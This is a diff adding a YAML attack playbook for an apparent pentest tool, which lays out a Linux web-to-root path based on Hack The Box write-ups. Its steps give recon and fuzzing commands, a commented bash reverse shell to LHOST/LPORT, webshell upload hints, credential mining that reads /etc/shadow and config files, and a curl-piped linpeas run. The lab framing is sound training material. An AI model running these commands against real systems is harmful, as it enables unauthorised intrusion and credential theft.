@@ -1,0 +1,101 @@
+name: linux-web-to-root
+display_name: "Linux Web-to-Root"
+description: "Full Linux attack path — from web enumeration through CMS exploitation to root shell. Extracted from HTB BoardLight and LinkVortex writeups."
+
+applicable_when:
+  ports: [22, 80]
+  services: ["ssh", "http"]
+
+steps:
+  - id: web-fingerprint
+    name: "Web Stack Fingerprinting"
+    phase: recon
+    description: "Identify web technology, CMS, framework, and server version"
+    commands:
+      - "whatweb http://{IP}"
+      - "curl -sI http://{IP}"
+      - "capo scan detailed --ports 80"
+    check:
+      ports_min: 1
+
+  - id: domain-vhost
+    name: "Domain & VHost Discovery"
+    phase: recon
+    description: "Extract domain from page content, fuzz for virtual hosts that may host different apps"
+    commands:
+      - "curl -s http://{IP} | grep -oE '[a-zA-Z0-9.-]+\\.[a-z]{2,}' | sort -u"
+      - "ffuf -u http://{IP} -H 'Host: FUZZ.{DOMAIN}' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200,301,302,403 -fs BASELINE_SIZE"
+      - "# Add discovered domains and vhosts to /etc/hosts"
+
+  - id: dir-fuzz
+    name: "Directory & File Fuzzing"
+    phase: recon
+    description: "Discover hidden directories, backup files, and admin panels"
+    commands:
+      - "capo web fuzz"
+      - "capo web fuzz --ext php,txt,bak,conf,old"
+      - "feroxbuster -u http://{IP} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt"
+    check:
+      directories_min: 1
+
+  - id: cms-detect
+    name: "CMS Detection & Default Creds"
+    phase: recon
+    description: "Identify CMS platform, try default credentials, search for known CVEs"
+    commands:
+      - "# WordPress: wpscan --url http://{IP} -e ap,at,u"
+      - "# Drupal: droopescan scan drupal -u http://{IP}"
+      - "# Ghost: curl http://{IP}/ghost/"
+      - "# Dolibarr: try admin:admin at login page"
+      - "# Joomla: joomscan -u http://{IP}"
+      - "searchsploit CMS_NAME VERSION"
+
+  - id: exploit-cms
+    name: "CMS Exploitation"
+    phase: exploitation
+    description: "Exploit CMS vulnerability or default credentials for initial access"
+    commands:
+      - "# Use discovered CVE or authenticated RCE"
+      - "# Upload webshell via CMS admin panel if creds found"
+      - "# Reverse shell: bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'"
+
+  - id: user-shell
+    name: "Stabilize User Shell"
+    phase: exploitation
+    description: "Upgrade to stable interactive shell, try SSH with discovered creds"
+    commands:
+      - "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
+      - "ssh {USER}@{IP}"
+    check:
+      credentials_min: 1
+
+  - id: config-creds
+    name: "Config File Credential Mining"
+    phase: credential-access
+    description: "Search web app configs, .env files, and database connections for reusable passwords"
+    commands:
+      - "find / -name 'wp-config.php' -o -name '.env' -o -name 'config.php' -o -name 'conf.php' -o -name 'database.yml' 2>/dev/null"
+      - "grep -ri 'password\\|db_pass\\|secret' /var/www /opt /srv 2>/dev/null | head -30"
+      - "cat /etc/shadow 2>/dev/null"
+      - "ls -la /home/*/.ssh/"
+
+  - id: privesc-enum
+    name: "Privilege Escalation Enumeration"
+    phase: privilege-escalation
+    description: "Run automated privesc enumeration to find escalation vectors"
+    commands:
+      - "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh"
+      - "find / -perm -4000 -type f 2>/dev/null"
+      - "sudo -l"
+      - "getcap -r / 2>/dev/null"
+      - "cat /etc/crontab && ls -la /etc/cron.d/"
+
+  - id: root-shell
+    name: "Root Access"
+    phase: post-exploitation
+    description: "Exploit privesc vector for root shell and capture flags"
+    commands:
+      - "# Exploit SUID binary, sudo misconfiguration, or kernel vuln"
+      - "cat /root/proof.txt && id && hostname && ip addr"
+    check:
+      flags: true
